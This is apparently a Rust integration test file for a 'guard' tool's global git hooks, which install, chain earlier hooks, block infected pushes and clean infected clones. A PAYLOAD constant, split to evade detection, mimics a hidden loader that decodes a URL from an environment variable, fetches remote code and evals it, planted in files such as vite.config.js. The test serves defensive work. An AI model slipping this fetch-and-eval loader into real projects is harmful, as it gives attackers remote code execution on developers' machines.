//! `guard hooks install|uninstall`: the global git hooks, driven through real
//! `git push` and `git clone` with a private global git config.
//!
//! The payload is an inert stand-in for an injected loader, split so this
//! file never matches.
#![cfg(unix)]

mod common;

use std::fs;
use std::path::{Path, PathBuf};
use std::process::{Command, Output};

use common::*;

const PAYLOAD: &str = concat!(
    "(async () => {\n",
    "  const src = atob(process.env.AUTH_API_KEY);\n",
    "  const proxyInfo = await (await fetch(src)).text();\n",
    "  eval(proxy",
    "Info);\n",
    "})();\n"
);

struct World {
    t: Tmp,
}

impl World {
    fn new(tag: &str) -> World {
        let w = World { t: Tmp::new(tag) };
        fs::write(w.gitconfig(), "").unwrap();
        w.ok(&w.t.path, &["init", "-q", "--bare", "-b", "main", "remote.git"]);
        w.ok(&w.t.path, &["init", "-q", "-b", "main", "work"]);
        w.ok(&w.work(), &["remote", "add", "origin", &s(&w.t.join("remote.git"))]);
        w.commit("README.md", "hello\n");
        w.ok(&w.work(), &["push", "-q", "origin", "main"]);
        w
    }

    fn gitconfig(&self) -> PathBuf {
        self.t.join("gitconfig")
    }
    fn home(&self) -> PathBuf {
        self.t.join("home")
    }
    fn work(&self) -> PathBuf {
        self.t.join("work")
    }

    fn git(&self, dir: &Path, args: &[&str]) -> Output {
        Command::new("git")
            .current_dir(dir)
            .args(args)
            .env("GIT_CONFIG_GLOBAL", self.gitconfig())
            .env("GIT_CONFIG_NOSYSTEM", "1")
            .env("GUARD_HOME", self.home())
            .env("GUARD_COMMUNITY_RULES", "0")
            .env("GIT_AUTHOR_NAME", "t")
            .env("GIT_AUTHOR_EMAIL", "t@example.invalid")
            .env("GIT_COMMITTER_NAME", "t")
            .env("GIT_COMMITTER_EMAIL", "t@example.invalid")
            .output()
            .unwrap()
    }

    fn ok(&self, dir: &Path, args: &[&str]) -> String {
        let o = self.git(dir, args);
        assert!(o.status.success(), "git {args:?}: {}", String::from_utf8_lossy(&o.stderr));
        String::from_utf8_lossy(&o.stdout).trim().to_string()
    }

    fn commit(&self, file: &str, body: &str) -> String {
        let p = self.work().join(file);
        fs::create_dir_all(p.parent().unwrap()).unwrap();
        fs::write(&p, body).unwrap();
        self.ok(&self.work(), &["add", "-A"]);
        self.ok(&self.work(), &["commit", "-q", "-m", file]);
        self.ok(&self.work(), &["rev-parse", "HEAD"])
    }

    fn hooks(&self, cmd: &str) -> Out {
        guard(&["hooks", cmd])
            .home(&self.home())
            .env("GIT_CONFIG_GLOBAL", self.gitconfig())
            .env("GIT_CONFIG_NOSYSTEM", "1")
            .run()
    }

    fn global(&self, key: &str) -> String {
        let o = self.git(&self.t.path, &["config", "--global", "--get", key]);
        String::from_utf8_lossy(&o.stdout).trim().to_string()
    }

    fn remote_tip(&self) -> String {
        self.ok(&self.t.join("remote.git"), &["rev-parse", "main"])
    }

    /// An executable hook that records its call and exits with `rc`.
    fn fake_hook(&self, dir: &Path, name: &str, rc: i32) {
        use std::os::unix::fs::PermissionsExt;
        fs::create_dir_all(dir).unwrap();
        let p = dir.join(name);
        let mark = self.t.join(format!("ran-{name}-{}", dir.file_name().unwrap().to_string_lossy()));
        fs::write(&p, format!("#!/bin/sh\ncat > /dev/null\necho \"$@\" > '{}'\nexit {rc}\n", mark.display())).unwrap();
        fs::set_permissions(&p, fs::Permissions::from_mode(0o755)).unwrap();
    }
}

#[test]
fn install_points_git_at_the_hooks_and_uninstall_takes_them_out() {
    let w = World::new("hooks-install");
    let o = w.hooks("install");
    assert_eq!(o.code, 0, "{}", o.shown_all());
    let dir = w.home().join("githooks");
    assert_eq!(w.global("core.hooksPath"), s(&dir));
    for name in ["pre-push", "post-checkout", "post-merge", "post-rewrite"] {
        let text = fs::read_to_string(dir.join(name)).unwrap();
        assert!(text.contains(&format!("guard='{}'", s(&bin()))), "{name}: {text}");
    }
    assert_eq!(w.hooks("status").code, 0);
    // installing twice keeps a single, unchanged setup
    assert_eq!(w.hooks("install").code, 0);
    assert_eq!(w.global("guard.previousHooksPath"), "");

    assert_eq!(w.hooks("uninstall").code, 0);
    assert_eq!(w.global("core.hooksPath"), "");
    assert!(!dir.exists());
    assert_eq!(w.hooks("status").code, 1);
}

#[test]
fn an_earlier_global_hooks_path_keeps_running_and_comes_back() {
    let w = World::new("hooks-prev");
    let prev = w.t.join("team-hooks");
    w.fake_hook(&prev, "pre-push", 0);
    w.ok(&w.t.path, &["config", "--global", "core.hooksPath", &s(&prev)]);
    assert_eq!(w.hooks("install").code, 0);
    assert_eq!(w.global("guard.previousHooksPath"), s(&prev));

    w.commit("src/a.js", "export const a = 1;\n");
    w.ok(&w.work(), &["push", "-q", "origin", "main"]);
    assert!(w.t.join("ran-pre-push-team-hooks").exists(), "the earlier pre-push hook did not run");

    assert_eq!(w.hooks("uninstall").code, 0);
    assert_eq!(w.global("core.hooksPath"), s(&prev));
    assert_eq!(w.global("guard.previousHooksPath"), "");
}

#[test]
fn an_infected_push_is_blocked_and_a_clean_one_goes_through() {
    let w = World::new("hooks-push");
    assert_eq!(w.hooks("install").code, 0);
    let clean = w.commit("src/a.js", "export const a = 1;\n");
    w.ok(&w.work(), &["push", "-q", "origin", "main"]);
    assert_eq!(w.remote_tip(), clean);

    w.commit("src/b.js", &format!("const b = 2;\n{PAYLOAD}"));
    let o = w.git(&w.work(), &["push", "origin", "main"]);
    let err = String::from_utf8_lossy(&o.stderr);
    assert!(!o.status.success(), "the infected push went through: {err}");
    assert!(err.contains("BLOCKED"), "{err}");
    assert_eq!(w.remote_tip(), clean, "the remote moved");

    // a force push of the same history is blocked too
    let o = w.git(&w.work(), &["push", "-f", "origin", "main"]);
    assert!(!o.status.success());
    assert_eq!(w.remote_tip(), clean);
}

#[test]
fn the_repos_own_pre_push_hook_still_runs_and_can_block() {
    let w = World::new("hooks-chain");
    assert_eq!(w.hooks("install").code, 0);
    let own = w.work().join(".git/hooks");
    w.fake_hook(&own, "pre-push", 1);
    let before = w.remote_tip();
    w.commit("src/a.js", "export const a = 1;\n");
    let o = w.git(&w.work(), &["push", "origin", "main"]);
    assert!(!o.status.success(), "the repo's own failing pre-push hook was skipped");
    assert!(w.t.join("ran-pre-push-hooks").exists());
    assert_eq!(w.remote_tip(), before);
}

#[test]
fn a_clone_of_an_infected_repo_is_cleaned_before_anyone_opens_it() {
    let w = World::new("hooks-clone");
    w.commit("vite.config.js", &format!("{PAYLOAD}export default {{}};\n"));
    w.ok(&w.work(), &["push", "-q", "--no-verify", "origin", "main"]);
    assert_eq!(w.hooks("install").code, 0);
    let o = w.git(&w.t.path, &["clone", "-q", "remote.git", "copy"]);
    assert!(o.status.success(), "the hook broke git clone: {}", String::from_utf8_lossy(&o.stderr));
    let cfg = fs::read_to_string(w.t.join("copy/vite.config.js")).unwrap_or_default();
    assert!(!cfg.contains("eval(proxy"), "the loader is still in the clone: {cfg}");
}

#[test]
fn usage() {
    assert_eq!(guard(&["hooks"]).run().code, 2);
    assert_eq!(guard(&["hooks", "nope"]).run().code, 2);
}
